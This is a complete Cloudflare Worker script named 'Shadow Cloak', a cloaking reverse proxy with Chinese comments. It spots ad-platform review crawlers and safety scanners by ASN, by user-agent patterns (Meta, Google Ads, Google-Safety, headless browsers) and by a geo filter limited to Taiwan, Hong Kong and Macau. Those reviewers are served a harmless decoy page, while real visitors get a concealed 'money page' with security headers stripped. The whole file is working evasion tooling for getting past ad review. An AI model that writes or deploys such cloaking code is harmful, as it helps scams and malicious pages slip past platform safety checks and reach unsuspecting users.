// ============================================
// 隱者斗篷 (Shadow Cloak) v1.1
// Cloudflare Worker - 反向代理斗篷系統
// 更新：修正源站指向，改用 Workers 子網域
// ============================================

// --- 配置區 ---
const SAFE_PAGE_ORIGIN = "https://safe-page.laoqin1689.workers.dev";
const MONEY_PAGE_ORIGIN = "https://money-page.laoqin1689.workers.dev";
const MONEY_PAGE_PATHS = {
  default: "/0906-2-2/",
};
const ALLOWED_COUNTRIES = new Set(["TW", "HK", "MO"]);
const GEO_FILTER_ENABLED = true;
const IP_WHITELIST = new Set([]);

const BLOCKED_ASNS = new Set([
  32934, 15169, 396982, 16509, 14618, 8075, 8068, 8069, 13335, 14061,
  20473, 63949, 20940, 24940, 16276, 31898, 45102, 132203, 36351,
  60781, 7203, 51167, 46606, 26496, 33070, 12876, 36007, 7979, 9009,
  8100, 36352, 40676, 21859,
]);

const BOT_UA_PATTERN = new RegExp([
  "facebookexternalhit", "Facebot", "Meta-ExternalAgent", "Meta-ExternalFetcher",
  "AdsBot-Google", "AdsBot-Google-Mobile", "Mediapartners-Google", "Google-Safety", "Googlebot",
  "bot", "crawl", "spider", "slurp", "Baiduspider", "YandexBot", "DuckDuckBot",
  "Sogou", "Exabot", "ia_archiver",
  "python-requests", "python-urllib", "curl\\/", "wget\\/",
  "HeadlessChrome", "PhantomJS", "Selenium", "puppeteer", "playwright",
  "ahrefs", "semrush", "mj12bot", "dotbot", "rogerbot", "screaming frog",
  "SiteAuditBot", "UptimeRobot", "Pingdom",
].join("|"), "i");

function detectBot(request) {
  const userAgent = request.headers.get("User-Agent") || "";
  const cf = request.cf || {};
  const asn = cf.asn;
  const country = cf.country;
  const clientIP = request.headers.get("CF-Connecting-IP") || "";

  if (clientIP && IP_WHITELIST.has(clientIP)) {
    return { isBot: false, reason: "whitelisted_ip" };
  }
  if (asn && BLOCKED_ASNS.has(asn)) {
    return { isBot: true, reason: `blocked_asn:${asn}` };
  }
  if (BOT_UA_PATTERN.test(userAgent)) {
    return { isBot: true, reason: `bot_ua:${userAgent.substring(0, 80)}` };
  }
  if (GEO_FILTER_ENABLED && country && !ALLOWED_COUNTRIES.has(country)) {
    return { isBot: true, reason: `geo_blocked:${country}` };
  }
  if (!userAgent || userAgent.length < 10) {
    return { isBot: true, reason: "empty_or_short_ua" };
  }
  return { isBot: false, reason: "passed" };
}

async function proxyTo(request, targetOrigin, rewriteHost) {
  const url = new URL(request.url);
  const targetUrl = targetOrigin + url.pathname + url.search;
  const headers = new Headers(request.headers);
  headers.delete("X-Forwarded-For");
  headers.delete("X-Real-IP");
  headers.set("Host", new URL(targetOrigin).hostname);

  const response = await fetch(targetUrl, {
    method: request.method,
    headers: headers,
    body: request.method !== "GET" && request.method !== "HEAD" ? request.body : undefined,
    redirect: "follow",
  });

  const newHeaders = new Headers(response.headers);
  newHeaders.delete("X-Powered-By");
  newHeaders.delete("Server");
  newHeaders.delete("Content-Security-Policy");
  newHeaders.delete("X-Frame-Options");

  const contentType = response.headers.get("Content-Type") || "";
  if (contentType.includes("text/html") && rewriteHost) {
    let html = await response.text();
    const sourceHost = new URL(targetOrigin).hostname;
    html = html.replace(new RegExp(sourceHost.replace(/\./g, "\\."), "g"), rewriteHost);
    return new Response(html, {
      status: response.status,
      statusText: response.statusText,
      headers: newHeaders,
    });
  }

  return new Response(response.body, {
    status: response.status,
    statusText: response.statusText,
    headers: newHeaders,
  });
}

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const url = new URL(request.url);
  const hostname = url.hostname;

  if (url.pathname === "/_health") {
    return new Response("OK", { status: 200 });
  }

  if (url.pathname === "/_debug") {
    const detection = detectBot(request);
    const cf = request.cf || {};
    return new Response(JSON.stringify({
      detection,
      info: {
        ip: request.headers.get("CF-Connecting-IP"),
        asn: cf.asn,
        country: cf.country,
        city: cf.city,
        userAgent: request.headers.get("User-Agent"),
        hostname: hostname,
      },
      timestamp: new Date().toISOString(),
    }, null, 2), {
      status: 200,
      headers: { "Content-Type": "application/json" },
    });
  }

  const detection = detectBot(request);
  if (detection.isBot) {
    try {
      return await proxyTo(request, SAFE_PAGE_ORIGIN, null);
    } catch (e) {
      return new Response(getFallbackSafePage(), {
        status: 200,
        headers: { "Content-Type": "text/html; charset=utf-8" },
      });
    }
  } else {
    try {
      return await proxyTo(request, MONEY_PAGE_ORIGIN, hostname);
    } catch (e) {
      return new Response("Service temporarily unavailable", { status: 503 });
    }
  }
}

function getFallbackSafePage() {
  return `<!DOCTYPE html>
<html lang="zh-TW">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>歡迎光臨</title>
<style>
body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; max-width: 800px; margin: 0 auto; padding: 40px 20px; color: #333; line-height: 1.6; }
h1 { color: #1a1a2e; }
.content { background: #f8f9fa; padding: 30px; border-radius: 8px; margin: 20px 0; }
footer { margin-top: 40px; padding-top: 20px; border-top: 1px solid #eee; font-size: 14px; color: #666; }
</style>
</head>
<body>
<h1>歡迎光臨我們的網站</h1>
<div class="content">
<p>我們致力於提供最優質的服務與產品資訊。</p>
<p>如有任何問題，歡迎透過以下方式聯繫我們。</p>
</div>
<footer>
<p>&copy; 2026 All Rights Reserved.</p>
<p><a href="/privacy">隱私權政策</a> | <a href="/terms">服務條款</a></p>
</footer>
</body>
</html>`;
}
